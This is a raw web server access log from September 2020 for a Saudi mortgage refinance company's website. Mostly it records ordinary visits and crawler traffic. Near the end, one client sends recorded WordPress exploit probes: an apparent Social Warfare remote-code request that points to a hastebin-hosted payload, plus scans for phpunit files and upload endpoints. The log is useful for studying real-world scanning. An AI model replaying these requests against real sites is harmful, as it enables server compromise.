94.187.55.91    - [16-Sep-2020 11:26:14 Asia/Riyadh] "GET /about-src/ :443" 200 - WhatsApp/2.20.198.15 A
91.232.101.17   - [16-Sep-2020 11:26:19 Asia/Riyadh] "GET /about-src/ :443" 200 - Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1
94.187.55.91    - [16-Sep-2020 11:26:35 Asia/Riyadh] "GET /about-src/ :443" 200 - Mozilla/4.0 (compatible; ms-office)
94.187.55.91    - [16-Sep-2020 11:26:40 Asia/Riyadh] "GET /about-src/ :443" 200 - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
69.191.249.206  - [16-Sep-2020 11:41:30 Asia/Riyadh] "GET /board-of-directors-report/ :443" 200 - Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359 Safari/537.36
70.39.129.110   - [16-Sep-2020 11:49:51 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
54.161.11.154   - [16-Sep-2020 11:52:45 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36 [http://www.srco.com.sa/]
37.43.100.215   - [16-Sep-2020 11:54:48 Asia/Riyadh] "GET /ar/partners-ar/ :443" 200 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0
114.119.132.131 - [16-Sep-2020 11:58:38 Asia/Riyadh] "GET /ar :443" 200 - Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+http://aspiegel.com/petalbot)
54.190.193.155  - [16-Sep-2020 12:04:53 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36
52.114.77.26    - [16-Sep-2020 12:08:44 Asia/Riyadh] "GET /partners/ :443" 200 - Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
103.92.115.141  - [16-Sep-2020 12:09:55 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
103.92.115.141  - [16-Sep-2020 12:10:20 Asia/Riyadh] "GET /partners/ :443" 200 - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 [https://srco.com.sa/]
103.92.115.141  - [16-Sep-2020 12:12:45 Asia/Riyadh] "GET /news/ :443" 200 - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
103.92.115.141  - [16-Sep-2020 12:13:11 Asia/Riyadh] "GET /news/news/saudi-real-estate-refinance-company-src-signs-sar1bn-deal-with-bidaya-home-finance/ :443" 200 - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
103.92.115.141  - [16-Sep-2020 12:13:29 Asia/Riyadh] "GET /news/news/src-signs-a-strategic-partnership-deal-of-sar-1bn-with-deutsche-gulf-finance/ :443" 200 - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
103.92.115.141  - [16-Sep-2020 12:19:57 Asia/Riyadh] "GET /news/news/src-signs-a-strategic-partnership-deal-of-sar-1bn-with-deutsche-gulf-finance/ :443" 200 - Mozilla/4.0 (compatible; ms-office)
103.92.115.141  - [16-Sep-2020 12:20:07 Asia/Riyadh] "GET /news/news/saudi-real-estate-refinance-company-src-signs-sar1bn-deal-with-bidaya-home-finance/ :443" 200 - Mozilla/4.0 (compatible; ms-office)
51.39.169.10    - [16-Sep-2020 12:20:08 Asia/Riyadh] "GET /ar/partners-ar/ :443" 200 - Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [LinkedInApp] [https://www.linkedin.com/]
103.92.115.141  - [16-Sep-2020 12:20:19 Asia/Riyadh] "GET /news/news/saudi-real-estate-refinance-company-src-signs-sar1bn-deal-with-bidaya-home-finance/ :443" 200 - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
106.215.167.150 - [16-Sep-2020 12:29:23 Asia/Riyadh] "GET /partners/ :443" 200 - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
114.119.132.104 - [16-Sep-2020 12:30:19 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+http://aspiegel.com/petalbot)
40.94.95.79     - [16-Sep-2020 12:30:53 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36
176.98.34.98    - [16-Sep-2020 12:35:22 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36
176.98.34.98    - [16-Sep-2020 12:35:30 Asia/Riyadh] "GET /partner-link/ :443" 200 - Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36
216.18.204.211  - [16-Sep-2020 12:36:13 Asia/Riyadh] "GET /news/news/src-signs-a-strategic-partnership-deal-of-sar-1bn-with-deutsche-gulf-finance/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:36:21 Asia/Riyadh] "GET /ar/الأسئلة-الشائعة/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:36:31 Asia/Riyadh] "GET /ar/القوائم-المالية/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:36:41 Asia/Riyadh] "GET /news/news/aiming-to-provide-more-accessible-home-loans-src-signs-partnership-agreement-with-dat/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:36:50 Asia/Riyadh] "GET /ar/تقرير-مجلس-الإدارة/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:36:59 Asia/Riyadh] "GET /news/news/home-loans-become-more-accessible-for-saudi-house-hunters-src-signs-partnership-agreement-with-ncb-to-acquire-mortgage-portfolio/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:37:22 Asia/Riyadh] "GET /whistleblower/login/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:37:37 Asia/Riyadh] "GET /whistleblower/add-ticket/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:37:49 Asia/Riyadh] "GET /whistleblower/my-tickets/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
34.255.87.116   - [16-Sep-2020 12:38:03 Asia/Riyadh] "GET /feed :443" 200 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
34.255.87.116   - [16-Sep-2020 12:38:03 Asia/Riyadh] "GET /atom.xml :443" 404 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
34.255.87.116   - [16-Sep-2020 12:38:03 Asia/Riyadh] "GET /feeds/ :443" 404 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
34.255.87.116   - [16-Sep-2020 12:38:03 Asia/Riyadh] "GET /index.xml :443" 404 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
34.255.87.116   - [16-Sep-2020 12:38:04 Asia/Riyadh] "GET /index.rdf :443" 404 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
34.255.87.116   - [16-Sep-2020 12:38:04 Asia/Riyadh] "GET /index.rss :443" 404 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
34.255.87.116   - [16-Sep-2020 12:38:04 Asia/Riyadh] "GET /feeds :443" 404 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
34.255.87.116   - [16-Sep-2020 12:38:05 Asia/Riyadh] "GET /feed/ :443" 200 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
216.18.204.211  - [16-Sep-2020 12:38:05 Asia/Riyadh] "GET /whistleblower/control-panel/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
34.255.87.116   - [16-Sep-2020 12:38:05 Asia/Riyadh] "GET /rss.xml :443" 404 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
34.255.87.116   - [16-Sep-2020 12:38:05 Asia/Riyadh] "GET /index.atom :443" 404 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
34.255.87.116   - [16-Sep-2020 12:38:06 Asia/Riyadh] "GET /?format=feed&type=rss :443" 200 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
31.166.182.208  - [16-Sep-2020 12:38:08 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Linux; Android 10; HMA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36
34.255.87.116   - [16-Sep-2020 12:38:09 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
216.18.204.211  - [16-Sep-2020 12:39:32 Asia/Riyadh] "GET /ar/create-a-ticket/login/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
81.218.45.178   - [16-Sep-2020 12:40:02 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
216.18.204.211  - [16-Sep-2020 12:40:17 Asia/Riyadh] "GET /ar/create-a-ticket/add-ticket/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:40:26 Asia/Riyadh] "GET /ar/create-a-ticket/my-tickets/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:40:36 Asia/Riyadh] "GET /ar/create-a-ticket/control-panel/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:40:46 Asia/Riyadh] "GET /whistleblower/faqs/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
81.218.45.178   - [16-Sep-2020 12:40:47 Asia/Riyadh] "GET /news/ :443" 200 - Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
216.18.204.211  - [16-Sep-2020 12:41:08 Asia/Riyadh] "GET /whistleblower/downloads/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:41:28 Asia/Riyadh] "GET /whistleblower/announcements/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:41:40 Asia/Riyadh] "GET /whistleblower/knowledgebase/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:41:51 Asia/Riyadh] "GET /whistleblower/ticket-status/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:42:34 Asia/Riyadh] "GET /ar/create-a-ticket/faqs/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:42:45 Asia/Riyadh] "GET /ar/create-a-ticket/downloads/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:42:57 Asia/Riyadh] "GET /ar/create-a-ticket/announcements/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:43:08 Asia/Riyadh] "GET /ar/create-a-ticket/knowledgebase/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:43:18 Asia/Riyadh] "GET /ar/create-a-ticket/ticket-status/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:43:33 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:43:41 Asia/Riyadh] "GET /ar/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:43:52 Asia/Riyadh] "GET /faq/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:44:00 Asia/Riyadh] "GET /news/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:44:11 Asia/Riyadh] "GET /career/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:44:26 Asia/Riyadh] "GET /partners/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:44:35 Asia/Riyadh] "GET /products/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:44:46 Asia/Riyadh] "GET /about-src/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:44:57 Asia/Riyadh] "GET /news/news/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:45:06 Asia/Riyadh] "GET /partner-link/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:45:17 Asia/Riyadh] "GET /whistleblower/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:45:28 Asia/Riyadh] "GET /financial-statements/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:45:40 Asia/Riyadh] "GET /board-of-directors-report/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:45:49 Asia/Riyadh] "GET /news/news/banque-saudi-fransi-to-expand-ltfr-mortgages-with-src-funding/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:46:01 Asia/Riyadh] "GET /news/news/src-injects-another-sar1-billion-into-saudi-housing-finance-market/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:46:11 Asia/Riyadh] "GET /news/news/saudi-real-estate-refinance-company-src-signs-sar1bn-deal-with-bidaya-home-finance/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:46:21 Asia/Riyadh] "GET /my-login :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:46:31 Asia/Riyadh] "GET /ar/career-2/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:47:10 Asia/Riyadh] "GET /ar/products-2/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:47:21 Asia/Riyadh] "GET /ar/about-src-2/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:47:33 Asia/Riyadh] "GET /ar/partners-ar/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:47:42 Asia/Riyadh] "GET /ar/news/news-ar/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
216.18.204.211  - [16-Sep-2020 12:47:54 Asia/Riyadh] "GET /ar/create-a-ticket/ :443" 200 - Mozilla/5.0 (compatible; Adsbot/3.1)
66.249.75.152   - [16-Sep-2020 12:52:20 Asia/Riyadh] "GET /sitemap-posttypes-news.xml :443" 200 - Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
69.191.249.219  - [16-Sep-2020 13:04:40 Asia/Riyadh] "GET /financial-statements/ :443" 200 - Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359 Safari/537.36
3.18.67.70      - [16-Sep-2020 13:05:33 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36
52.12.1.235     - [16-Sep-2020 13:08:31 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36
81.67.65.114    - [16-Sep-2020 13:13:14 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0
81.67.65.114    - [16-Sep-2020 13:13:23 Asia/Riyadh] "GET /wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://hastebin.com/raw/etonipusij :443" 404 - Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0
81.67.65.114    - [16-Sep-2020 13:13:27 Asia/Riyadh] "GET /wp-admin/vuln.php :443" 404 - Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0
81.67.65.114    - [16-Sep-2020 13:13:32 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0
81.67.65.114    - [16-Sep-2020 13:13:38 Asia/Riyadh] "GET /wp-admin/vuln.htm :443" 404 - Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0
81.67.65.114    - [16-Sep-2020 13:13:42 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0
81.67.65.114    - [16-Sep-2020 13:13:51 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0
81.67.65.114    - [16-Sep-2020 13:13:58 Asia/Riyadh] "GET /_input_3_vuln.htm :443" 404 - Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0
81.67.65.114    - [16-Sep-2020 13:14:01 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0
81.67.65.114    - [16-Sep-2020 13:14:08 Asia/Riyadh] "GET /wp-content/_input_3_vuln.htm :443" 404 - Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0
81.67.65.114    - [16-Sep-2020 13:14:13 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0
81.67.65.114    - [16-Sep-2020 13:14:23 Asia/Riyadh] "GET /?up_auto_log=true :443" 200 - Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0
81.67.65.114    - [16-Sep-2020 13:14:30 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0
81.67.65.114    - [16-Sep-2020 13:14:38 Asia/Riyadh] "GET /wp-content/plugins/contabileads/integracoes/mautic/api-library/vendor/phpunit/phpunit/build.xml :443" 404 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:14:44 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:14:52 Asia/Riyadh] "GET /wp-content/plugins/prh-api/vendor/phpunit/phpunit/build.xml :443" 404 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:14:57 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:15:05 Asia/Riyadh] "GET /wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/build.xml :443" 404 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:15:09 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:15:17 Asia/Riyadh] "GET /wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/build.xml :443" 404 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:15:23 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:15:29 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0
81.67.65.114    - [16-Sep-2020 13:15:54 Asia/Riyadh] "GET /wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/build.xml :443" 404 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:15:58 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:16:07 Asia/Riyadh] "GET /wp-content/plugins/cloudflare/vendor/phpunit/phpunit/build.xml :443" 404 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:16:15 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:16:20 Asia/Riyadh] "GET /wp-content/plugins/realia/libraries/PayPal-PHP-SDK/vendor/phpunit/phpunit/build.xml :443" 404 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:16:25 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:16:34 Asia/Riyadh] "GET /wp-content/plugins/woocommerce-software-license-manager/vendor/phpunit/phpunit/build.xml :443" 404 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:16:39 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:16:46 Asia/Riyadh] "GET /wp-content/themes/enfold-child/update_script/vendor/phpunit/phpunit/build.xml :443" 404 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:16:52 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
81.67.65.114    - [16-Sep-2020 13:16:58 Asia/Riyadh] "GET /jm-ajax/upload_file/ :443" 404 - Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0
81.67.65.114    - [16-Sep-2020 13:17:01 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0
81.67.65.114    - [16-Sep-2020 13:17:10 Asia/Riyadh] "GET / :443" 200 - Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0
